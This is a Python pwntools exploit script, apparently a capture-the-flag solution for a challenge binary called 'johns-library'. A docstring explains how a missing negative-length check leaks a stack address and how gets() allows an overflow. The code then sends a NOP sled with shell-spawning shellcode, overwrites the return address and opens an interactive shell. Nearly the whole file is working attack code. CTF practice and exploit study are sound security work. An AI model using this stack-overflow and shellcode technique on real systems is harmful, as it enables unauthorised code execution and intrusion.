from pwn import *

"""
Both functions are given a pointer to a stack address (named BUFF)
Add function (overflow):
Drops the given length into a global buffer starting at 0x804a060
There is no negative check, so feeding a negative value passes the check
Vulnerable gets() function drops input into BUFF

Read (mem leak):
Takes the previously given length from add and adds that offset in BUFF
Because we can use negative values, we can looks backwards on the stack
to discover the beginning address of BUFF

Exit (trigger):
The overflow from the add isn't exploited until exiting the program
"""


r = process('./johns-library')
# r = remote('library.polictf.it', 80)

# Debugging help with gdb
'''
gdb.attach(r, """
bp 0x8048640
bp 0x8048742
c
""")
'''

log.info("Setting up leak of buffer")
r.sendline('a')
r.sendline(str(-28)) # Set len to subtract to find original buffer location
r.sendline()

log.info("Leaking buffer")
r.sendline('r')
r.sendline('1')
# r.recv()
# r.recv()
r.recvuntil('read: ')

ret = r.recv()[:4]

log.info('Got buffer: {}'.format(ret[::-1].encode('hex')))

log.info("Preparing shellcode")
shellcode = '\x90' * 900 + asm(shellcraft.sh())

payload = shellcode
payload += cyclic(cyclic_find('aaks') - len(shellcode))
payload += ret
payload += 'a' * (1000 - len(payload))

log.info("Sending shellcode")
r.sendline('a')
r.sendline(payload)

log.info("Exiting problem, causing the exploit")
r.sendline('u')

log.success("And your shell...")
r.interactive()
